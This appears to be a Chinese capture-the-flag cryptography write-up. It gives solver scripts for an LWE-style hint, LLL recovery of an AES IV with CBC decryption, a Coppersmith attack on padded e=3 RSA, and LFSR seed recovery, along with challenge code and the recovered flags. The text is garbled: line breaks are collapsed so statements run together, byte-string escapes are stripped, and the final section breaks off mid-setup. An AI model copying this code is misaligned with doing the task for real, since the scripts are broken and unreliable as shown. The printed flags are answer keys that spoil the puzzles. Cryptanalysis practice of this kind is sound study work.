'''-3.257518803980229925210589904230583482986646342139415561576950148286382674434770529248486501793457710730252401258721482142654716015216299244487794967600132597049154513815052213387666360825101667524635777006510550117512116441539852315185793280311905620746025669520152068447372368293640072502196959919309286241b'x8fjx94x98-x1fdxd5x89xbexa9*Tux90xb7'b'x9fT@xbcx82x8esQx1exd8x1dxdbx9bxb4xf8rUxc8xa0xcbxaf Hxa9.x04x1exd2x92x1fx0fBja-x965xxa8@xc9xxf9xafx87xd1xa5}xfcx1bxe0#xc3mxc9x8973x1cx1fx13x8fxb2axaexa9]xb9xc2xe8x83Ax80x13gxc9ax1c<x8ax9c&xd9xbdx06xefxba9xb0x03x9fx022xc9x13x9axffXPGxc6oxc0xeaV7)XG9Lx84N7Uxe3Wn0Gx8exd3x04(nx08xb9x17xe6xf1xaaxb7x8a@$x16x13x06Ax00xc9Zxdfx7fQxc9x08xb4xf3Pxfcpexe2xebx96x0e(-xdex17xd1x01x1c_x82x8bx9fwxc8x86xfbwxb5xf7xd0xc8x1784xe3?x00x0b.)xb7xbcx8e{xe0xaex8d$x0fx19'xb6xee@dx00xd9x84x8cx0exa3,xc6axa3xba*1xfd<xfdx18xd6x9ex8c4x8e#xfdxbd&0RxeddE,xedxb6x1ex00x11xa6Kxd3x1dTx8c5x8ex00xeax10xe9'u"B#xa1#xd8xe3xf5jxbcx94Mxdaxe3xcb*xf0W1xa0x80x1dxfcxbfox01?(darxb6x86xd0x90x88Zxa1`Bx89x89x89xb3vxa5xf0xe0x0cx8excc+Pxfcxfd#x83xe9x93x96nxf2xa5xfbxc3xc5xaax9ex89x93xb6xf5xeax8c%NYxc3x0eRxfasxa1x13xf2/*xcex8b_:
_rxebxbex0bx8ax8cx97x7f|m}xaexa9Ix95xccxe7x80xa5yC4x1f5xa4Pxc5xbf.xf9Vxe8|xbbxc3xcbx98&'JBx99x94xc0r$x0bxbe48uxebxcaxa1xfbbxd8_Rx97x8exaeIxfcxc2xb2xd2#@xecx16xf1xd7eCQx1cOx13xcaxb5xd3x1axb1xf1_Dx80x06xa5xbexbevxbdxd6xbbx9axc9xx9cf:
xcb>xa2xe1xcadxde]awxa0xdcxb2xb3{+x85x8dx8bxc5rTxccxd9Xxd5x9br<x99mxb8b6sxbfpx0eo~xe9&xb2{xbexeex93xd2N1\x94x968IWO7xcbxb6ex80xf7x9airxb2~x17x1cFx0fx82T]RBXxdexx13x85xfaxcd-xcexdcxe4xe5^x99uxb5x01xd0-xc3Cxcdxc4y6xb7x9d|L1xe74xf7x8cHxe9xa9xfavnxec;xf2xa2wxfbx13_br)z!xa3xc8xa8xc2xd2x10x00x11x11rxb2&xfbx04&x84">x6l[x06n>xa0xbex9c`xa7x9exe0xfbx85x91xc4,xcfxacxe11@axed3@xfd}x8exfaTpxcb7xe7xbfxd4xe0~bxd9xe0<xbax81xd4"exfcx939|j#0Hx86xf8x0bx03xd2xe8xf5xe55xdcxc8x06\xb7)xccx9b'xf12''''

第一段解hint

from Crypto.Util.number import *from tqdm import tqdmimport numpy as np
P=[[87, -27, -52, -29], [57, -41, -24, -60], [76, -17, -55, -37], [75, -46, -33, -21], [121, -55, -33, -34], [47, -4, -34, -45], [112, -33, -44, -16], [74, -44, -5, -25], [20, -21, -16, -49], [89, -21, -54, -24], [18, -23, -53, -1], [35, -40, -4, -29], [105, -54, -2, -8], [44, -24, -43, -36], [111, -15, -15, -54]]C=[[24, 75, 81, 85], [24, 14, 85, 102], [115, 1, 5, 21], [58, 118, 104, 77], [65, 42, 101, 103], [33, 38, 50, 67], [7, 81, 38, 58], [117, 101, 54, 11], [44, 29, 81, 8], [59, 114, 70, 121], [62, 13, 9, 105], [11, 43, 97, 23], [39, 82, 75, 97], [122, 113, 14, 30], [70, 102, 116, 5], [58, 44, 61, 20], [73, 119, 59, 28], [119, 68, 57, 122], [61, 91, 83, 44], [103, 29, 1, 73], [47, 60, 120, 125], [17, 126, 14, 21], [104, 8, 78, 123], [72, 121, 54, 74], [48, 104, 49, 66], [72, 56, 27, 69], [34, 110, 41, 54], [33, 54, 74, 44], [70, 65, 11, 113], [122, 3, 69, 35], [58, 7, 39, 64], [59, 106, 49, 66], [77, 92, 87, 92], [95, 21, 96, 83], [67, 55, 30, 73], [99, 54, 18, 90], [101, 102, 126, 107], [81, 46, 104, 83], [38, 24, 94, 60], [114, 105, 76, 97], [22, 115, 20, 67], [40, 72, 110, 65], [111, 92, 106, 117], [5, 123, 21, 96], [41, 14, 23, 114], [113, 75, 43, 65], [56, 3, 61, 48], [40, 101, 16, 114], [42, 84, 95, 13], [36, 110, 91, 107], [4, 13, 60, 74], [24, 80, 125, 76], [123, 26, 27, 119], [31, 87, 6, 123], [61, 106, 73, 120], [66, 10, 36, 65], [91, 38, 46, 9], [121, 20, 106, 48], [123, 21, 78, 27], [22, 74, 55, 110], [47, 49, 118, 76], [30, 10, 16, 118], [43, 19, 52, 61], [100, 9, 37, 35], [20, 102, 111, 94], [116, 63, 55, 43], [13, 110, 42, 14], [46, 65, 71, 28], [82, 5, 76, 74], [86, 34, 117, 84], [28, 44, 82, 50], [76, 79, 77, 11], [68, 39, 51, 89], [83, 93, 95, 2], [54, 108, 101, 82], [99, 90, 122, 37], [16, 92, 79, 12], [67, 86, 24, 36], [80, 94, 106, 59], [50, 56, 95, 98], [33, 68, 89, 40], [74, 124, 14, 82], [88, 93, 54, 93], [51, 17, 124, 31], [17, 17, 45, 35], [113, 71, 76, 44], [48, 6, 120, 4], [36, 91, 108, 11], [2, 41, 58, 72], [42, 59, 51, 81], [73, 22, 79, 27], [85, 35, 29, 98], [76, 76, 37, 22], [82, 29, 42, 27], [75, 114, 37, 106], [40, 69, 53, 73], [39, 44, 33, 121], [94, 85, 92, 54], [91, 77, 124, 46], [108, 31, 101, 84], [35, 33, 97, 45], [99, 32, 17, 14], [1, 66, 11, 35], [78, 100, 95, 81], [73, 49, 14, 37], [70, 9, 107, 2], [84, 98, 92, 62], [123, 87, 87, 110], [3, 81, 111, 28], [20, 2, 91, 37], [93, 101, 77, 93], [27, 16, 31, 105], [95, 81, 87, 17], [10, 103, 21, 102], [81, 57, 118, 82], [15, 92, 60, 71], [16, 84, 126, 49], [35, 26, 2, 120], [70, 86, 45, 9], [29, 8, 40, 66], [99, 77, 14, 9], [12, 70, 50, 52], [21, 21, 85, 54], [91, 94, 100, 85], [9, 42, 47, 14], [117, 55, 17, 99], [53, 45, 4, 72], [49, 10, 27, 121], [108, 61, 73, 42], [121, 42, 41, 71], [49, 63, 50, 117], [5, 78, 24, 101], [0, 117, 21, 46], [90, 43, 47, 32], [74, 85, 118, 84], [13, 73, 18, 66], [95, 24, 120, 18], [94, 21, 111, 34], [66, 68, 80, 21], [102, 49, 57, 55], [25, 85, 107, 98], [8, 18, 88, 12], [18, 6, 86, 82], [18, 91, 126, 115], [26, 11, 30, 35], [88, 78, 76, 74], [51, 75, 76, 15], [60, 24, 72, 27], [91, 72, 44, 104], [84, 113, 39, 116], [41, 83, 91, 74], [84, 17, 94, 119], [46, 95, 85, 5], [109, 58, 71, 42], [126, 29, 114, 73], [27, 70, 7, 125], [121, 66, 97, 111], [8, 21, 10, 57], [15, 62, 65, 8], [101, 79, 32, 74], [69, 42, 38, 58], [65, 81, 72, 16], [20, 81, 1, 126], [91, 111, 69, 33], [56, 84, 65, 66], [47, 78, 43, 100], [43, 90, 80, 25], [46, 55, 10, 60], [116, 110, 49, 116], [72, 115, 38, 104], [79, 43, 74, 106], [86, 113, 84, 76], [102, 2, 119, 3], [126, 25, 83, 44], [37, 83, 46, 40], [13, 75, 101, 101], [76, 93, 3, 63], [69, 9, 84, 37], [103, 47, 106, 80], [72, 104, 85, 19], [124, 118, 34, 81], [57, 25, 52, 119], [44, 56, 63, 90], [123, 46, 124, 31], [19, 116, 23, 77], [126, 78, 37, 93], [34, 95, 43, 98], [37, 90, 32, 97], [106, 8, 80, 8], [90, 5, 113, 68], [99, 40, 39, 18], [90, 37, 48, 45], [56, 13, 76, 6], [68, 33, 52, 102], [62, 45, 29, 123], [100, 21, 73, 92], [92, 18, 118, 23], [84, 86, 42, 83], [107, 8, 71, 52], [114, 106, 78, 85], [10, 120, 115, 119], [27, 49, 124, 16], [65, 40, 48, 37], [69, 42, 8, 29], [35, 39, 55, 102], [58, 19, 41, 75], [17, 2, 113, 12], [8, 34, 72, 75], [91, 32, 19, 52], [62, 50, 109, 78], [9, 115, 35, 50], [42, 83, 78, 41], [34, 94, 97, 58], [56, 73, 25, 115], [55, 12, 16, 86], [97, 95, 30, 92], [47, 105, 70, 68], [50, 18, 51, 23], [46, 57, 80, 29], [4, 66, 123, 24], [55, 53, 26, 36], [71, 59, 104, 91], [94, 3, 1, 34], [57, 8, 85, 102], [89, 73, 115, 25], [13, 38, 81, 76], [104, 30, 81, 104], [55, 101, 95, 101], [69, 65, 5, 11], [123, 105, 84, 125], [38, 110, 4, 28], [112, 115, 92, 71], [90, 120, 112, 39], [50, 18, 107, 71], [95, 63, 118, 93], [93, 111, 59, 55], [17, 15, 2, 88], [78, 126, 37, 12], [56, 112, 53, 12], [65, 34, 82, 100], [9, 94, 72, 99], [78, 76, 43, 91], [7, 88, 107, 31], [43, 91, 97, 4], [113, 112, 36, 15], [8, 97, 23, 84], [65, 92, 31, 63], [54, 38, 119, 103], [89, 50, 57, 50], [61, 37, 87, 0], [21, 35, 44, 22], [20, 32, 95, 116], [10, 94, 103, 84], [59, 29, 7, 50], [98, 33, 87, 33], [7, 96, 36, 67], [85, 10, 35, 98], [65, 49, 19, 62], [56, 67, 14, 91], [30, 49, 111, 77], [121, 49, 108, 119], [89, 67, 115, 69], [65, 8, 0, 82], [117, 57, 117, 23], [23, 38, 2, 98], [60, 28, 94, 93], [23, 65, 8, 114], [121, 105, 122, 40], [120, 12, 21, 112], [55, 51, 2, 77], [48, 41, 113, 62], [66, 82, 117, 119], [4, 15, 5, 21], [41, 14, 12, 80], [23, 61, 106, 16], [23, 53, 122, 68], [6, 54, 5, 101], [69, 49, 7, 79], [17, 70, 64, 88], [103, 30, 76, 31], [108, 82, 90, 109], [55, 56, 113, 37], [93, 99, 126, 44], [1, 46, 105, 124], [55, 54, 35, 115], [0, 89, 53, 97], [67, 111, 107, 80], [92, 122, 40, 64], [75, 2, 126, 118], [90, 84, 43, 74], [101, 69, 60, 17], [104, 10, 4, 122], [94, 4, 115, 91], [15, 11, 111, 105], [9, 7, 32, 101], [77, 18, 55, 56], [66, 7, 117, 108], [116, 121, 33, 66], [32, 41, 83, 125], [60, 52, 70, 58], [125, 54, 93, 15], [70, 19, 10, 58], [83, 94, 61, 126], [95, 85, 80, 44], [25, 89, 117, 74], [12, 17, 63, 87], [118, 80, 96, 26], [6, 97, 79, 38], [97, 3, 107, 95], [7, 82, 106, 92], [83, 100, 119, 95], [81, 26, 99, 56], [25, 60, 51, 122], [56, 18, 22, 84], [9, 72, 107, 114], [80, 97, 92, 52], [108, 47, 58, 46], [9, 47, 7, 47], [115, 68, 91, 7], [14, 120, 87, 122], [97, 15, 40, 79], [5, 92, 85, 93], [4, 97, 73, 63], [25, 22, 92, 108], [88, 4, 34, 86], [0, 43, 21, 57], [67, 90, 36, 50], [15, 126, 37, 12], [92, 73, 96, 71], [76, 107, 27, 115], [79, 8, 68, 55], [38, 12, 120, 126], [54, 46, 7, 69], [72, 114, 93, 60], [59, 98, 27, 102], [50, 76, 87, 19], [77, 107, 29, 40], [36, 73, 21, 123], [36, 89, 82, 74], [24, 73, 118, 86], [58, 89, 115, 106], [12, 27, 33, 72], [28, 94, 21, 26], [0, 79, 48, 110], [72, 62, 82, 57], [65, 84, 114, 97], [80, 68, 52, 52], [119, 35, 103, 101], [10, 67, 68, 69], [101, 17, 54, 40], [98, 46, 21, 42], [30, 39, 56, 118], [27, 33, 77, 114], [66, 74, 61, 63], [23, 13, 14, 47], [88, 30, 122, 119], [15, 58, 55, 52], [56, 27, 47, 45], [119, 95, 59, 14], [84, 69, 5, 83], [21, 35, 39, 36], [10, 92, 68, 17], [79, 67, 111, 38], [36, 1, 4, 117], [117, 30, 5, 7], [112, 15, 115, 123], [54, 47, 18, 93], [102, 111, 3, 68], [91, 91, 5, 44], [123, 118, 57, 32], [12, 121, 31, 103], [114, 52, 105, 12], [100, 28, 117, 102], [51, 42, 12, 124], [47, 1, 42, 47], [28, 3, 22, 100], [103, 105, 119, 24], [101, 59, 13, 78], [79, 36, 61, 54], [11, 46, 75, 116], [31, 73, 118, 0], [92, 32, 0, 124], [77, 85, 25, 90], [29, 21, 74, 7], [3, 66, 11, 8], [112, 91, 50, 53], [45, 113, 99, 123], [35, 65, 85, 22], [108, 99, 42, 1], [103, 113, 116, 72], [125, 74, 112, 24], [75, 79, 80, 12], [83, 44, 94, 86], [64, 20, 0, 8], [104, 126, 31, 120], [85, 75, 61, 74], [36, 93, 36, 102], [70, 54, 101, 83], [90, 46, 109, 83], [112, 126, 114, 23], [16, 123, 97, 62], [118, 86, 108, 53], [99, 18, 2, 18], [103, 3, 38, 8], [99, 49, 123, 81], [37, 75, 89, 53], [34, 77, 27, 122], [29, 8, 40, 66], [119, 13, 64, 83], [4, 108, 116, 121], [49, 87, 1, 92], [15, 63, 80, 62], [27, 81, 100, 83], [7, 90, 16, 0], [13, 50, 61, 65], [51, 64, 76, 5], [55, 100, 106, 66], [52, 102, 105, 2], [49, 34, 89, 116], [24, 55, 11, 27], [91, 48, 73, 38], [27, 5, 1, 126], [66, 55, 80, 19], [52, 118, 104, 43], [36, 1, 111, 60], [65, 4, 34, 17], [54, 22, 0, 39], [52, 30, 64, 62], [26, 40, 32, 86], [93, 71, 41, 47], [77, 23, 15, 9], [11, 20, 51, 31], [64, 50, 37, 50], [17, 49, 80, 37], [119, 115, 115, 50], [20, 86, 27, 5], [101, 65, 17, 78], [56, 25, 125, 56], [16, 118, 2, 96], [114, 108, 69, 121], [14, 37, 76, 101], [113, 124, 121, 82], [43, 120, 35, 94], [82, 67, 23, 43], [9, 79, 47, 122], [39, 28, 110, 31], [35, 48, 27, 16], [72, 8, 115, 66], [54, 46, 122, 19], [77, 77, 30, 74], [58, 63, 81, 96], [6, 122, 75, 63], [115, 31, 119, 110], [82, 86, 89, 1], [79, 100, 6, 110], [117, 67, 15, 13], [4, 15, 63, 0], [106, 108, 122, 107], [34, 72, 0, 114], [20, 0, 32, 56], [121, 104, 66, 3], [86, 28, 76, 84], [85, 9, 60, 45], [95, 80, 78, 65], [39, 85, 50, 49], [42, 103, 36, 90], [70, 99, 116, 117], [34, 15, 40, 52], [24, 49, 19, 31], [98, 90, 95, 89], [63, 45, 40, 77], [114, 14, 30, 106], [10, 35, 116, 9], [103, 111, 112, 16], [71, 112, 71, 32], [77, 31, 105, 64], [84, 87, 24, 67], [1, 27, 123, 57], [104, 29, 87, 123], [110, 39, 67, 7], [28, 70, 108, 113], [96, 9, 101, 36], [13, 28, 6, 13], [69, 81, 89, 26], [79, 113, 77, 91], [112, 62, 104, 117], [109, 95, 55, 83], [78, 68, 98, 14], [73, 79, 96, 12], [108, 39, 97, 49], [27, 111, 106, 100], [82, 70, 9, 36], [48, 31, 90, 70], [99, 92, 45, 35], [55, 100, 31, 37], [75, 17, 69, 35], [12, 38, 119, 112], [103, 34, 63, 76], [26, 19, 91, 111], [74, 122, 12, 78], [64, 117, 16, 60], [2, 97, 122, 106], [62, 79, 56, 30], [71, 47, 13, 22], [38, 78, 116, 16], [87, 28, 94, 76], [77, 126, 94, 116], [83, 46, 104, 90], [5, 95, 13, 26], [47, 10, 46, 115], [82, 19, 91, 70], [111, 72, 49, 65], [18, 103, 59, 72], [17, 37, 56, 24], [19, 120, 24, 64], [28, 40, 11, 20], [18, 19, 80, 62], [37, 11, 74, 14], [109, 97, 75, 72], [116, 65, 52, 121], [95, 63, 82, 122], [88, 93, 54, 93], [77, 30, 65, 121], [99, 121, 42, 87], [62, 52, 44, 6], [79, 60, 55, 4], [96, 64, 6, 20], [94, 114, 90, 8], [123, 98, 29, 27], [116, 84, 31, 80], [9, 77, 45, 45], [120, 33, 63, 15], [51, 44, 66, 25], [2, 46, 72, 94], [107, 113, 50, 46], [115, 64, 126, 85], [64, 10, 28, 78], [84, 112, 64, 103], [59, 114, 15, 82], [65, 122, 104, 89], [113, 122, 21, 11], [69, 106, 19, 78], [42, 93, 125, 0], [7, 123, 82, 70], [103, 114, 62, 92], [15, 30, 78, 114], [4, 78, 111, 60], [40, 80, 34, 55], [3, 87, 120, 27], [122, 64, 3, 122], [24, 49, 31, 81], [26, 43, 100, 19], [52, 78, 2, 97], [116, 45, 15, 33], [21, 119, 92, 86], [28, 118, 71, 24], [106, 15, 0, 79], [36, 4, 52, 73], [22, 43, 8, 60], [96, 22, 9, 100], [19, 64, 26, 96], [97, 61, 22, 39], [6, 112, 76, 38], [58, 6, 97, 94], [103, 87, 87, 101], [17, 49, 80, 37], [117, 33, 26, 8], [59, 108, 78, 91], [113, 28, 30, 44], [119, 78, 72, 20], [49, 101, 77, 2], [26, 18, 35, 7], [34, 38, 99, 37], [45, 52, 90, 27], [108, 31, 118, 67], [3, 37, 29, 88], [111, 96, 12, 111], [91, 111, 106, 100], [52, 78, 117, 80], [14, 51, 87, 0], [1, 52, 116, 1], [117, 2, 33, 48], [57, 0, 48, 34], [59, 14, 84, 63], [82, 83, 8, 82], [58, 100, 32, 33], [75, 29, 112, 103], [0, 49, 45, 54], [94, 9, 51, 110], [54, 61, 27, 47], [88, 89, 23, 37], [73, 43, 0, 32], [123, 6, 35, 78], [73, 72, 119, 64], [81, 46, 11, 102], [42, 124, 47, 8], [50, 66, 3, 40], [116, 7, 51, 20], [47, 112, 99, 7], [42, 37, 86, 89], [18, 74, 78, 101], [57, 85, 75, 7], [26, 90, 35, 10], [72, 126, 10, 77], [55, 12, 5, 78], [37, 87, 85, 96], [91, 9, 114, 68], [79, 76, 44, 20], [84, 52, 63, 56], [95, 9, 22, 117], [96, 38, 50, 67], [43, 114, 45, 56], [94, 21, 74, 107], [92, 82, 81, 71], [40, 10, 10, 90], [20, 18, 15, 56], [72, 2, 30, 22], [50, 31, 123, 20], [85, 40, 115, 115], [93, 1, 48, 47], [111, 118, 45, 34], [9, 122, 37, 121], [60, 27, 77, 41], [122, 38, 22, 39], [115, 66, 74, 126], [77, 67, 90, 78], [96, 3, 53, 52], [5, 26, 120, 101], [45, 100, 72, 6], [106, 56, 87, 77], [52, 68, 102, 95], [1, 13, 36, 33], [58, 27, 35, 8], [52, 5, 38, 35], [102, 82, 63, 47], [24, 71, 119, 43], [11, 36, 90, 13], [11, 93, 27, 23], [4, 107, 26, 125], [85, 9, 5, 13], [116, 25, 55, 119], [73, 82, 73, 2], [40, 123, 77, 41], [10, 98, 51, 111], [23, 79, 120, 54], [56, 18, 22, 84], [61, 115, 51, 109], [33, 5, 12, 121], [8, 81, 35, 70], [22, 39, 103, 2], [38, 74, 66, 126], [83, 20, 117, 85], [8, 32, 91, 98], [37, 31, 94, 119], [7, 30, 45, 43], [68, 16, 124, 97], [86, 124, 37, 21], [29, 101, 15, 30], [27, 31, 52, 45], [47, 37, 102, 3], [117, 49, 54, 89], [48, 94, 126, 66], [42, 115, 63, 104], [14, 74, 6, 112], [68, 125, 4, 5], [66, 3, 78, 52], [108, 33, 6, 77], [77, 99, 16, 52], [61, 78, 73, 70], [108, 106, 124, 0], [23, 35, 119, 118], [125, 124, 37, 65], [69, 30, 61, 110], [77, 10, 120, 118], [53, 121, 24, 30], [87, 32, 29, 63], [54, 64, 1, 3], [16, 59, 104, 25], [30, 6, 59, 102], [43, 120, 35, 94], [89, 13, 69, 39], [87, 78, 100, 14], [83, 17, 14, 4], [24, 49, 31, 81], [73, 32, 72, 10], [0, 22, 61, 54], [81, 42, 70, 13], [108, 56, 52, 2], [25, 99, 116, 72], [66, 23, 18, 102], [121, 115, 47, 12], [96, 37, 123, 48], [64, 69, 4, 39], [78, 38, 124, 31], [27, 69, 10, 70], [5, 29, 2, 85], [30, 45, 56, 7], [31, 25, 120, 61], [36, 89, 89, 118], [98, 63, 18, 21], [121, 83, 36, 57], [60, 5, 86, 17], [121, 55, 117, 58], [12, 96, 4, 27], [119, 63, 124, 37], [96, 27, 45, 91], [42, 119, 8, 103], [104, 42, 68, 37], [104, 55, 41, 38], [120, 3, 50, 87], [120, 121, 20, 67], [58, 123, 50, 28], [103, 62, 58, 20], [97, 27, 89, 102], [7, 51, 56, 108], [73, 60, 10, 77], [56, 72, 103, 69], [101, 89, 18, 66], [115, 35, 80, 36], [98, 103, 39, 63], [29, 126, 67, 76], [27, 97, 15, 79], [36, 6, 17, 90], [126, 54, 101, 42], [115, 66, 74, 126], [78, 80, 62, 83], [60, 11, 31, 88], [16, 73, 108, 13]]
P = np.array(P)C = np.array(C)q = 127n = 3
P = np.array(P)C = np.array(C)b = P[:, 0].reshape(-1, 1)A = -P[:, 1:]T = []for i in range(q//2):    for j in range(q//2):        for k in range(q//2):                T.append([i,j,k])for t in T:    t = np.array(t).reshape(-1, 1)    e = (b - np.dot(A, t))%q    e = e.T.tolist()[0]    if all(i in [0,1,125,126] for i in e):        s = np.concatenate([np.ones(1, dtype=np.int32), (t.T)[0]])        break
M = (np.dot(C, s) % q).tolist()m = ''for i in M:    if i>=np.floor(2*q / 3) or i<=np.floor(q / 3):        m+='0'    else:        m+='1'print(long_to_bytes(int(m,2)))#b"Congratulations,you're amazing!Here's a hint: sin(iv) + leak * cos(iv) = 0, keep it up! @V@"

第二段解iv

import libnumt = 3.257518803980229925210589904230583482986646342139415561576950148286382674434770529248486501793457710730252401258721482142654716015216299244487794967600132597049154513815052213387666360825101667524635777006510550117512116441539852315185793280311905620746025669520152068447372368293640072502196959919309286241a = arctan(t)ts = 2^1024
A = int(a*ts)Pi = int((pi).n(1024)*ts)
G = Matrix([[1,0,-ts],[0,1,int(Pi)],[0,0,A]])m = G.LLL()[0][0]print(m)print(libnum.n2s(int(m)))#b'?xaa =txbcxddQxac/yqx13xc3x7fxb9'

第三段解flag

from Crypto.Cipher import AESfrom Crypto.Util.Padding import pad,unpadfrom Crypto.Util.strxor import strxoriv = b'?xaa =txbcxddQxac/yqx13xc3x7fxb9'c = b'x9fT@xbcx82x8esQx1exd8x1dxdbx9bxb4xf8rUxc8xa0xcbxaf Hxa9.x04x1exd2x92x1fx0fBja-x965xxa8@xc9xxf9xafx87xd1xa5}xfcx1bxe0#xc3mxc9x8973x1cx1fx13x8fxb2axaexa9]xb9xc2xe8x83Ax80x13gxc9ax1c<x8ax9c&xd9xbdx06xefxba9xb0x03x9fx022xc9x13x9axffXPGxc6oxc0xeaV7)XG9Lx84N7Uxe3Wn0Gx8exd3x04(nx08xb9x17xe6xf1xaaxb7x8a@$x16x13x06Ax00xc9Zxdfx7fQxc9x08xb4xf3Pxfcpexe2xebx96x0e(-xdex17xd1x01x1c_x82x8bx9fwxc8x86xfbwxb5xf7xd0xc8x1784xe3?x00x0b.)xb7xbcx8e{xe0xaex8d$x0fx19'xb6xee@dx00xd9x84x8cx0exa3,xc6axa3xba*1xfd<xfdx18xd6x9ex8c4x8e#xfdxbd&0RxeddE,xedxb6x1ex00x11xa6Kxd3x1dTx8c5x8ex00xeax10xe9'u"B#xa1#xd8xe3xf5jxbcx94Mxdaxe3xcb*xf0W1xa0x80x1dxfcxbfox01?(darxb6x86xd0x90x88Zxa1`Bx89x89x89xb3vxa5xf0xe0x0cx8excc+Pxfcxfd#x83xe9x93x96nxf2xa5xfbxc3xc5xaax9ex89x93xb6xf5xeax8c%NYxc3x0eRxfasxa1x13xf2/*xcex8b_:
_rxebxbex0bx8ax8cx97x7f|m}xaexa9Ix95xccxe7x80xa5yC4x1f5xa4Pxc5xbf.xf9Vxe8|xbbxc3xcbx98&'JBx99x94xc0r$x0bxbe48uxebxcaxa1xfbbxd8_Rx97x8exaeIxfcxc2xb2xd2#@xecx16xf1xd7eCQx1cOx13xcaxb5xd3x1axb1xf1_Dx80x06xa5xbexbevxbdxd6xbbx9axc9xx9cf:
xcb>xa2xe1xcadxde]awxa0xdcxb2xb3{+x85x8dx8bxc5rTxccxd9Xxd5x9br<x99mxb8b6sxbfpx0eo~xe9&xb2{xbexeex93xd2N1\x94x968IWO7xcbxb6ex80xf7x9airxb2~x17x1cFx0fx82T]RBXxdexx13x85xfaxcd-xcexdcxe4xe5^x99uxb5x01xd0-xc3Cxcdxc4y6xb7x9d|L1xe74xf7x8cHxe9xa9xfavnxec;xf2xa2wxfbx13_br)z!xa3xc8xa8xc2xd2x10x00x11x11rxb2&xfbx04&x84">x6l[x06n>xa0xbex9c`xa7x9exe0xfbx85x91xc4,xcfxacxe11@axed3@xfd}x8exfaTpxcb7xe7xbfxd4xe0~bxd9xe0<xbax81xd4"exfcx939|j#0Hx86xf8x0bx03xd2xe8xf5xe55xdcxc8x06\xb7)xccx9b'xf12'print(len(c))
key = b'x8fjx94x98-x1fdxd5x89xbexa9*Tux90xb7'

cipher = AES.new(key=key, iv=iv, mode=AES.MODE_CBC)
decrypted_bytes = cipher.decrypt(c)
chunk_size = 16chunks = [decrypted_bytes[i:i + chunk_size] for i in range(0, len(decrypted_bytes), chunk_size)]
flag = ""for chunk in chunks:    unpadded_chunk = unpad(chunk, 16)    flag += unpadded_chunk.decode()
print("解密后的 flag:", flag)#'flag{6ef25d1e-bb76-8e53-dbc4-1e56585f9aa9}'

sandwitch

from Crypto.Util.number import *import gmpy2flag = b'flag{fake_flag}'assert len(flag) == 39p = getPrime(512)q = getPrime(512)n = p * qe = 0x3pad1 = b'easy_problem'pad2 = b'How_to_solve_it'c = pow(bytes_to_long(pad1 + flag + pad2),e,n)print(f'n = {n}')print(f'c = {c}')
'''n = 130210658110511504736422597261591182174531847806532340762131145212035478695205314931974421838392310731226415266775095601890938846830080329061111533796518633011922277343217149648494987341818402753017296362015915834670450122261511337212801488239810623226740266516836721952886027130703886460578247562781194524199c = 58274335440051115211211273605191310114692293785750437685473044454042062899661976407492451518086227780147882738264722645944582899451063113444881286175099872016956825274378613983870549046907444680021237171113596116147511706486372974792692071549068969896395366667516390709069131700584308236332248449116109156503'''

cop

import libnum

n = 130210658110511504736422597261591182174531847806532340762131145212035478695205314931974421838392310731226415266775095601890938846830080329061111533796518633011922277343217149648494987341818402753017296362015915834670450122261511337212801488239810623226740266516836721952886027130703886460578247562781194524199c = 58274335440051115211211273605191310114692293785750437685473044454042062899661976407492451518086227780147882738264722645944582899451063113444881286175099872016956825274378613983870549046907444680021237171113596116147511706486372974792692071549068969896395366667516390709069131700584308236332248449116109156503e = 0x3pad1 = b'easy_problem'pad2 = b'How_to_solve_it'PR.<x> = PolynomialRing(Zmod(n))f = (libnum.s2n(pad1)*256**(39+len(pad2)) + x * 256 ** len(pad2) + libnum.s2n(pad2)) ** e - cf = f.monic()root = f.small_roots(X=2 ** (39 * 8),beta=0.9,epsilon=0.03)print(root)print(libnum.n2s(int(root[0])))
#b'flag{A_C0pper5mi1tH_4Ues7iOn_SplIt_Pad}'

happy

classGen:    def __init__(self, state):        self.nbits = 128        self.state = state & ((1 << self.nbits) - 1)        self.mask = 109908700282042807039366676242995409413

    def func0(self, steps=1):        for _ in range(steps):            res = self.state & self.mask            bit = sum([(res >> i) & 1for i in range(self.nbits)]) & 1            self.state = ((self.state << 1) ^ bit) & ((1 << self.nbits) - 1)        return bit
    def __next__(self):        out = 0        for _ in range(8):            bit = self.func0(2023)            out = (out << 1) ^ bit        return out

#!/usr/bin/env python
import os, utilsfrom secret import flagassert flag.startswith(b'flag{') and flag.endswith(b'}')
seed = int(os.urandom(16).hex(), 16)gen = utils.Gen(seed)msg = b'Happy4321: ' + flagenc = bytes(m ^ next(gen) for m in msg).hex()print(enc)
# cd1dd7c7a9cfe3c0067ff64694e64c38aa759c81d1c8f48cf6f7ee1df2d1e58584da52644ea56bd24dadca6bd5a6899a92b118f57de2529670264d48

nbits=128enc='cd1dd7c7a9cfe3c0067ff64694e64c38aa759c81d1c8f48cf6f7ee1df2d1e58584da52644ea56bd24dadca6bd5a6899a92b118f57de2529670264d48'enc=bytes.fromhex(enc)
part_flag=b'Happy4321: flag{'table = zip(part_flag,enc[:16])         #flag每位字符和密文对位异或endstate = [i^^j for i,j in table]     # 末态#print(endstate)enc=(bytes(endstate))#print(enc)t = []for i in range(16):    t.append(bin(enc[i])[2:].zfill(8))
leak = []for i in t:    for j in i:        leak.append(int(j))#print(leak)
def solve_leak(mask, leak):
    C = matrix(GF(2), nbits, nbits)    for i in range(nbits-1):        C[i+1, i] = 1    for i in range(nbits):        C[i, -1] = mask[i]
    M = list()    for i in range(nbits):      M += [(C^(2023*(i+1))).T[-1].list()]
    res = (vector(GF(2), leak) / matrix(GF(2), M).T).list()    seed = int(''.join(str(_) for _ in res), 2)    return seed
mask=109908700282042807039366676242995409413mask=[int(bit) for bit in bin(mask)[2:].rjust(128,'0')]seed=solve_leak(mask,leak)print("seed=",seed)
#seed= 16527323701539137374460041583215952894

1

classGen:    def __init__(self, state):        self.nbits = 128        self.state = state & ((1 << self.nbits) - 1)        self.mask = 109908700282042807039366676242995409413

    def func0(self, steps=1):        for _ in range(steps):            res = self.state & self.mask            bit = sum([(res >> i) & 1for i in range(self.nbits)]) & 1            self.state = ((self.state << 1) ^ bit) & ((1 << self.nbits) - 1)        return bit
    def __next__(self):        out = 0        for _ in range(8):            bit = self.func0(2023)            out = (out << 1) ^ bit        return out
enc ='cd1dd7c7a9cfe3c0067ff64694e64c38aa759c81d1c8f48cf6f7ee1df2d1e58584da52644ea56bd24dadca6bd5a6899a92b118f57de2529670264d48'mask = 109908700282042807039366676242995409413seed = 16527323701539137374460041583215952894gen = Gen(seed)
